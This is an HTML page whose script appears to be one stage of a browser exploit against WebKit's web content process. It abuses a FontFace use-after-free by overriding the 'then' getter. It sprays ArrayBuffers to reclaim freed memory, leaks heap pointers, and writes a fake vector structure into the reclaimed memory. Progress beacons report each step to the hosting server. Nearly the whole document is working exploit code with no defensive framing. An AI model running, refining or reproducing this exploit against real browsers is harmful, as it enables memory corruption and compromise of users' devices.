<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P726 — Precision Step-by-Step Oracle & Fault Isolation Scout</title>
<script>
'use strict';
/* ============================================================
 * P726 — Precision Step-by-Step Oracle & Fault Isolation Scout
 *
 * Ground Truth & Diagnosis from P725:
 * - Apache received CE-106444-9 (WebProcess SIGSEGV) right after RECLAIM-GO.
 * - This probe adds nanosecond synchronous beacons at every individual
 *   expression (REC-1 through REC-TIMER-FIRED, and individual property reads).
 * - This pinpoints the EXACT line of C++ memory fault.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P726-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function diffSnap(pre){
  if(!VIEW_B || !pre.length) return 'none';
  var ch = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== pre[q]){
      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  return ch.length ? ch.join(',') : 'none';
}

function run(){
  b('BOOT','p726-precision-scout');
  log('=== P726 Precision Oracle & Fault Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Step-by-Step Reclaim */
    log('[Step 2] Executing instrumented reclaim...');
    doReclaim(function(){
      /* Step 3: Granular Property Probe */
      log('\n[Step 3] Testing properties one-by-one...');
      testGranularOracle();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Precision Instrumented Reclaim ---- */
function doReclaim(cb){
  b('REC-1-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);
  b('REC-2-STYLE-OK', '');

  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;
  b('REC-3-FACE-OK', '');

  var absW = [], firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      b('REC-THEN-ENTER', 'fired=' + firedW);
      if(firedW) return undefined; firedW = true;

      if(stTr){ stTr.remove(); stTr.textContent = ''; }
      b('REC-THEN-STREM', '');

      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;
      b('REC-THEN-SPRAY-PRE', '');

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        absW.push(ab);
      }
      b('REC-THEN-SPRAY-DONE', 'count=' + absW.length);

      try{ document.fonts.check('1em trFam'); }catch(e){ b('REC-CHECK-ERR', e.message); }
      b('REC-THEN-EXIT', '');
      return undefined;
    }, set: function(){}
  });

  b('REC-4-LOAD-CALL', '');
  document.fonts.load('1em trFace, trFam', 'GH');
  b('REC-5-LOAD-RETURNED', '');

  setTimeout(function(){
    b('REC-6-TIMER-ENTER', '');
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);

    var dumpStr = 'baseK=' + best + '|nz=' + bestNz +
                  '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]);
    b('RECLAIM-OK', dumpStr);
    log('Deterministic Reclaim OK: ' + dumpStr);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Granular Property Probe ---- */
function probeOne(name){
  try {
    var val = FACE_B[name];
    b('PROP-' + name, 'val=' + String(val).slice(0, 100));
  } catch(e){
    b('PROP-' + name + '-ERR', (e.message||'').slice(0, 80));
  }
}

function testGranularOracle(){
  if(!VIEW_B || !FACE_B) return;

  b('ORACLE-START', '');

  /* 3A: Test safe, proven properties first */
  probeOne('family');
  probeOne('status');

  /* 3B: Test unicodeRange BEFORE poison */
  probeOne('unicodeRange');

  /* 3C: Test other properties with individual beacons */
  probeOne('style');
  probeOne('weight');
  probeOne('stretch');
  probeOne('display');

  /* 3D: Poison Vector with test signatures */
  VIEW_B[0] = 0x0000004200000041n; /* U+0041-0042 */
  VIEW_B[1] = 0x0000123400001000n; /* U+1000-1234 */
  VIEW_B[2] = P68;                  /* Target heap pointer */
  VIEW_B[11] = P58;                 /* m_buffer -> P58 */
  VIEW_B[12] = 0x0000000400000003n; /* cap=4, size=3 */
  b('POISON-OK', 'buf=P58|cap=4|size=3');

  /* 3E: Re-test unicodeRange POST-POISON! */
  probeOne('unicodeRange');

  /* 3F: Test status & fonts.check() */
  probeOne('status');
  try {
    var chk = document.fonts.check('1em trFace');
    b('CHECK-RESULT', 'chk=' + chk);
  } catch(e){
    b('CHECK-ERR', e.message);
  }

  /* 3G: Final State */
  var nzArr = [];
  for(var q=0; q<16; q++) nzArr.push('q' + q + '=0x' + h16(VIEW_B[q]));
  b('FINAL-STATE', nzArr.join(';').slice(0, 700));

  b('DONE', 'p726-complete');
  log('\n=== P726 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P726 — Precision Oracle & Fault Scout running...</pre></body></html>
